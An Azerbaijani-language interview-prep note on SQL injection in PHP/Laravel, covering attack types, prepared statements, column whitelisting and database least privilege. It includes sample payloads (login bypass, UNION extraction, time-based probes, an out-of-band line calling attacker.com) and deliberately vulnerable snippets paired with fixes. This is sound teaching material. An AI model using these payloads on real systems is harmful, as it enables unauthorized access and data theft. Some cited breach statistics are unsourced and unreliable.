# SQL Injection (Middle ⭐⭐)

## İcmal

SQL Injection — istifadəçinin daxil etdiyi datanın SQL query-nin bir hissəsi kimi icra edilməsidir. OWASP Top 10-un ən klassik üzvüdür, onilliklər keçsə də hələ ən çox istismar edilən zəifliklərdən biridir. Interview-da bu mövzu həm texniki anlayışı (niyə baş verir, necə işləyir), həm praktik müdafiəni (prepared statements, ORM, principle of least privilege) ölçür. SQLi tam database-ə nəzarəti ələ keçirə bilir — data oxumaq, dəyişdirmək, silmək, hətta OS command icra etmək.

## Niyə Vacibdir

2021-ci ildə Cit0day breach-i 23 milyard credential-i ifşa etdi — əsas vektor SQLi idi. 2024-cü il OWASP hesabatına görə veb tətbiqlərin 34%-i SQLi riski daşıyır. Framework istifadə etsəniz belə, raw query yazdığınız yerdə risk var. Bu mövzunu dərindən bilmək — "ORM işlətdim, qurtardım" düşüncəsindən uzaq olmaq — security mindset-inizin göstəricisidir.

## Əsas Anlayışlar

- **Classic (In-band) SQLi**: `' OR '1'='1` — WHERE şərtini həmişə true edir, bütün sətirləri qaytarır. `admin'--` — password check-i comment kimi atlatır
- **UNION-based SQLi**: `' UNION SELECT username, password FROM users--` ilə başqa cədvəldən data oxumaq. Şərt: column sayı və data tipi uyğun olmalıdır
- **Error-based SQLi**: Server xəta mesajında database strukturu ifşa olur: `column 'password' doesn't exist in table 'admins'` — admin cədvəlinin strukturunu öyrənir
- **Blind SQLi (Boolean-based)**: Cavab bilavasitə görünmür. `' AND 1=1--` (true) vs `' AND 1=2--` (false) — fərqli response ilə məlumat toplanır. Yavaş amma effektiv
- **Time-based Blind SQLi**: `' AND SLEEP(5)--` — server 5 saniyə gecikərsə, injection var. Database-ə çatışıq amma birbaşa output yoxdur
- **Out-of-band SQLi**: DNS ya da HTTP vasitəsilə data çıxarmaq: `'; SELECT LOAD_FILE('\\\\attacker.com\\payload')--` — DNS lookup ilə data sızır
- **Second-order (Stored) SQLi**: Data DB-yə düzgün (escaped) yazılır, amma sonrakı query-də interpolasiya edilərkən injection baş verir. Ən çətin aşkar edilən növüdür
- **Prepared Statements (Parameterized Queries)**: SQL skeleton ayrıca göndərilir (compile edilir), data ayrıca (bind edilir) — data heç vaxt SQL kimi parse edilmir. Bu fundamental müdafiə mexanizmidir
- **ORM istifadəsi**: Eloquent, Doctrine — default olaraq prepared statement istifadə edir. Lakin `DB::raw()`, `whereRaw()`, `selectRaw()` ilə user input birləşdirilərsə risk var
- **Input validation vs escaping**: Validation input növünü yoxlayır (integer, UUID), escaping xarakteri neytrallaşdırır — hər ikisi lazımdır, amma prepared statement əsasdır
- **Principle of Least Privilege**: DB user-ı yalnız lazım olan cədvəllərə, yalnız lazım olan əməliyyatlara icazəli olmalıdır. SELECT-dən başqa icazə yoxdursa, `DROP TABLE` icra edilə bilməz
- **WAF (Web Application Firewall)**: SQL injection pattern-larını detect edib bloklaya bilər — amma bypass mümkündür (encoding, obfuscation). Defense-in-depth layeri kimi
- **sqlmap**: Automated SQL injection testing tool-u — penetration test üçün, automated exploitation
- **Stored Procedures**: Parameterized yazılsalar injection riski azalır — lakin dynamic SQL (`EXEC('SELECT * FROM ' + @table)`) içindəki hələ risk var
- **NoSQL injection**: MongoDB-də `{"$where": "this.password == '...'"}`, `{"$gt": ""}` — benzer konsept, fərqli syntax. Mongoose ODM qoruyur, raw query-lərdə risk var
- **Column name injection**: `ORDER BY` ya da `GROUP BY`-da column adı istifadəçidən gəlsə — ORM kömək etmir, whitelist lazımdır
- **Error message suppression**: Production-da SQL error-larını user-ə göstərməmək — information disclosure önlənir. `APP_DEBUG=false`, generic error message

## Praktik Baxış

**Interview-da yanaşma:**
SQL injection-ı izah edərkən hücum vektorunu göstərin, sonra müdafiəni. "Prepared statement istifadə et" yetərlidir, amma əla cavab onu niyə qoruduğunu mexanizm səviyyəsinde izah edir: "query plan ayrıca compile edilir, data ayrıca bind edilir — data heç vaxt SQL parser-a çatmır."

**Follow-up suallar (top companies-da soruşulur):**
- "ORM istifadə etsəniz SQL injection riski sıfır olurmu?" → Xeyr. `whereRaw()`, `selectRaw()`, `DB::raw()` ilə user input birləşdirilərsə risk yaranır. Column adı dinamik olduqda ORM kömək etmir
- "Second-order injection nədir, niyə çox çətin aşkar edilir?" → Data DB-yə düzgün yazılır (məs: escaped username). Sonra bu data başqa query-ə interpolasiya edilir. Aşkar etmək üçün data flow-u tam izləmək lazımdır
- "Blind SQLi-nin time-based variantı niyə istifadə olunur?" → Cavab output-u görünmür (error da yoxdur). `SLEEP(5)` ilə boolean true/false-ı timing-dən öyrənir. Yavaş amma DB-nin hər versiyasında işləyir
- "DB user-ın minimum icazəsi niyə vacibdir?" → App user-ı `SELECT, INSERT, UPDATE, DELETE` ilə məhdud olsa, injection olunanda `DROP TABLE`, `CREATE USER`, xarici server connect etmək mümkün olmaz
- "`sqlmap` nə edir?" → Automated SQLi testing — GET/POST parametrlərini, cookie-ləri, header-ları test edir. İnjection tapdıqda dump, shell mümkündür. Legitimate pentest tool-u
- "Stored procedure SQLi-dən qoruyurmu?" → Parameterized stored procedure qoruyur. Amma procedure içindəki `EXEC('... ' + @param)` kimi dynamic SQL yenə risk yaradır

**Ümumi səhvlər (candidate-ların etdiyi):**
- "Laravel istifadə edirəm, SQL injection yoxdur" — `DB::raw()` ilə manual concatenation zamanı risk var
- Input validation-ı injection müdafiəsi kimi görmək — validation olsa belə prepared statement vacibdir
- Error message-ləri production-da göstərmək — DB strukturu açılır
- `htmlspecialchars()` ilə SQLi-yi önləməyə çalışmaq — SQL encoding HTML encoding-dən fərqlidir

**Yaxşı cavabı əla cavabdan fərqləndirən:**
"Prepared statement niyə qoruyur?" sualını mexanizm ilə cavablandıra bilmək: query plan SQL compile edilir, data ayrıca bind edilir — data string parser-a heç vaxt çatmır. Second-order injection-ı izah edə bilmək. DB privilege separation-ı bilmək.

## Nümunələr

### Tipik Interview Sualı

"SQL injection nədir? Laravel-də bu riski necə önləyərsiniz? Prepared statement niyə qoruyur?"

### Güclü Cavab

"SQL injection istifadəçi daxil etdiyi datanın SQL query hissəsi kimi icra edilməsidir. Məsələn, login formunda email olaraq `admin'--` yazılsa, query `WHERE email = 'admin'--' AND password = '...'` olur — `--` password check-i comment kimi atlatır, heç bir password olmadan admin girişi açılır.

Prepared statement bunu fundamental həll edir: DB driver-ı əvvəlcə SQL strukturunu compile edir (`SELECT * FROM users WHERE email = ?`), sonra data ayrıca bind edilir. Data string parser-a heç çatmır — SQL kimi interpret edilə bilməz.

Laravel-də Eloquent ORM default olaraq prepared statement istifadə edir — Eloquent query builder-da risk yoxdur. Lakin `DB::raw()` ilə user input birləşdirilsə risk var. Column adı dinamik olduqda whitelist şərtdir.

Əlavə müdafiə: DB user-ına minimum icazə — `SELECT, INSERT, UPDATE, DELETE`, heç vaxt `DROP, CREATE, GRANT`."

### Kod/Konfiqurasiya Nümunəsi

```php
// ============================================================
// ATTACK DEMONSTRATION
// ============================================================

// ❌ Vulnerable code
$email = $request->email; // attacker: "admin'--"
$query = "SELECT * FROM users WHERE email = '{$email}'";
// Real query: SELECT * FROM users WHERE email = 'admin'--'
// Password check comment oldu → authentication bypass!

// UNION attack:
// email = "' UNION SELECT username, password, null, null FROM admin_users--"
// → admin table-dan data çıxarılır

// ============================================================
// DEFENSE — Prepared Statements
// ============================================================

// ✅ Eloquent ORM (default safe)
$user = User::where('email', $request->email)
            ->where('active', true)
            ->first();
// Real query: SELECT * FROM users WHERE email = ? AND active = ?
// Bound values: ['admin\'--', true]
// Data heç vaxt SQL kimi parse edilmir

// ✅ Query Builder — positional binding
$users = DB::select(
    "SELECT * FROM users WHERE email = ? AND role = ?",
    [$request->email, 'admin']
);

// ✅ Query Builder — named binding (daha oxunaqlı)
$users = DB::select(
    "SELECT * FROM users WHERE email = :email AND status = :status",
    ['email' => $request->email, 'status' => 'active']
);

// ✅ whereRaw ilə binding (RAW lazımdırsa)
User::whereRaw("LOWER(email) = LOWER(?)", [$request->email])->first();

// ❌ whereRaw ilə concatenation — injection!
User::whereRaw("email LIKE '%{$request->search}%'")->get();

// ✅ whereRaw ilə binding
User::whereRaw("email LIKE ?", ["%{$request->search}%"])->get();
// Yaxud sadəcə:
User::where('email', 'like', "%{$request->search}%")->get();
```

```php
// ============================================================
// DYNAMIC COLUMN NAME — ORM kömək etmir
// ============================================================

// ❌ Column injection
$column = $request->sort_by; // attacker: "name; DROP TABLE users;--"
$users  = User::orderBy($column)->get(); // DANGER!

// ✅ Whitelist validation
$allowedSortColumns = ['name', 'email', 'created_at', 'updated_at', 'last_login'];
$allowedDirections  = ['asc', 'desc'];

$sortColumn    = in_array($request->sort_by, $allowedSortColumns, true)
    ? $request->sort_by
    : 'created_at';

$sortDirection = in_array(strtolower($request->sort_dir ?? 'asc'), $allowedDirections, true)
    ? $request->sort_dir
    : 'asc';

$users = User::orderBy($sortColumn, $sortDirection)->get();
```

```php
// ============================================================
// SECOND-ORDER SQL INJECTION
// ============================================================

// Step 1: Admin username kimi "admin'--" daxil edilib DB-yə yazılır
// Yazarkən escaped olduğu üçün DB-ə düzgün saxlanır: "admin'--"
$user = User::create(['username' => $request->username]); // SAFE — Eloquent

// Step 2: Sonra bu username başqa kontekstdə interpolasiya edilir
$username = DB::table('users')->where('id', $userId)->value('username');
// $username = "admin'--"  (DB-dən gəlir — "trusted" sanılır)

// ❌ Bu YANLIŞDIR — second-order injection!
DB::statement("UPDATE logs SET changed_by = '{$username}'");
// "UPDATE logs SET changed_by = 'admin'--'"  → injection!

// ✅ Həmişə prepared statement — data haradan gəlməsindən asılı olmayaraq
DB::statement("UPDATE logs SET changed_by = ?", [$username]);
// Qayda: External data kimi daxilən, DB-dən gələn data da "trusted" deyil
```

```sql
-- ============================================================
-- DB MINIMUM PRIVILEGE — Production
-- ============================================================

-- App user: yalnız lazım olan əməliyyatlar
CREATE USER 'app_user'@'%' IDENTIFIED BY 'StrongRandom$ecret!2024';

-- Tətbiq cədvəllərinə CRUD
GRANT SELECT, INSERT, UPDATE, DELETE
    ON myapp.users    TO 'app_user'@'%';
GRANT SELECT, INSERT, UPDATE, DELETE
    ON myapp.orders   TO 'app_user'@'%';
GRANT SELECT, INSERT, UPDATE, DELETE
    ON myapp.products TO 'app_user'@'%';

-- Read-only cədvəllər (lookup/config data)
GRANT SELECT ON myapp.countries  TO 'app_user'@'%';
GRANT SELECT ON myapp.currencies TO 'app_user'@'%';

-- Migration user — ayrı, yalnız migration zamanı istifadə
CREATE USER 'migration_user'@'localhost' IDENTIFIED BY 'MigrationPass!';
GRANT ALL PRIVILEGES ON myapp.* TO 'migration_user'@'localhost';

-- Heç vaxt app user-ına verma:
-- DROP, CREATE, ALTER, TRUNCATE — DDL
-- GRANT, REVOKE — privilege management
-- FILE, PROCESS, SUPER — OS access
-- REPLICATION — replica configuration

FLUSH PRIVILEGES;

-- PostgreSQL ekvivalenti
CREATE USER app_user WITH PASSWORD 'StrongRandom$ecret!2024';
GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE users, orders, products TO app_user;
-- Row Level Security (RLS) əlavə qoruma kimi:
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
CREATE POLICY order_owner ON orders
    USING (user_id = current_setting('app.current_user_id')::integer);
```

### Attack/Defense Nümunəsi

```
ATTACK FLOW — Classic SQLi Login Bypass:

1. Normal request:
   POST /login
   email=user@example.com&password=secret123
   
   Query: SELECT * FROM users WHERE email = 'user@example.com' AND password = 'hash'
   Result: Returns user row → login success

2. Attack:
   POST /login
   email=admin@example.com'--&password=anything

   Query: SELECT * FROM users WHERE email = 'admin@example.com'--' AND password = 'hash'
   → Comment-dən sonrası atlanır, password check olmur
   Result: admin user-ı qaytarır → bypass!

3. Daha ağır attack — UNION data extraction:
   email=' UNION SELECT id, username, password, email FROM admin_users--

   Query: SELECT * FROM users WHERE email = '' UNION SELECT id, username, password, email FROM admin_users--'
   Result: admin_users cədvəlinin bütün datası authentication cavabında gəlir

DEFENSE:
   Prepared statement ilə bu attack-lar mümkün deyil:
   
   DB::select("SELECT * FROM users WHERE email = ? AND password = ?",
              ["admin@example.com'--", 'anything'])
   
   Bound query: email field = literal string "admin@example.com'--"
   Apostrophe SQL syntax-ı deyil, data-nın hissəsidir — query belə olur:
   SELECT * FROM users WHERE email = E'admin@example.com\'--' AND password = ?
   Heç bir user tapılmır → 401 Unauthorized
```

## Praktik Tapşırıqlar

1. Codebase-inizdə `DB::raw`, `whereRaw`, `selectRaw` istifadəsini grep edin — hər birini yoxlayın
2. Dynamic `orderBy` column-u whitelist ilə təhlükəsizləşdirin, test edin
3. `DB::select("... WHERE id = {$id}")` kodu tapıb prepared statement ilə düzəldin
4. Production DB user-ının icazələrini yoxlayın: `SHOW GRANTS FOR 'app_user'@'%';` — artıq icazə varmı?
5. sqlmap-i test mühitindəki bir endpoint-ə qarşı işlədib nə tapır baxın (izinlə!)
6. Second-order injection ssenariusu yaradın: DB-dən gələn datanı raw query-ə interpolasiya edib exploit edin
7. `EXPLAIN ANALYZE` ilə SQL query analizi edin — injection-ı önləyən plan-ı hücum ilə müqayisə edin

## Əlaqəli Mövzular

- `01-owasp-top-10.md` — A03 Injection konteksti, OWASP risk prioriteti
- `09-input-validation.md` — Input validation əlavə qoruma kimi (layered defense)
- `11-least-privilege.md` — DB minimum privilege, blast radius azaltmaq
- `12-audit-logging.md` — SQLi cəhdlərini detect edib log etmək, anomaly detection
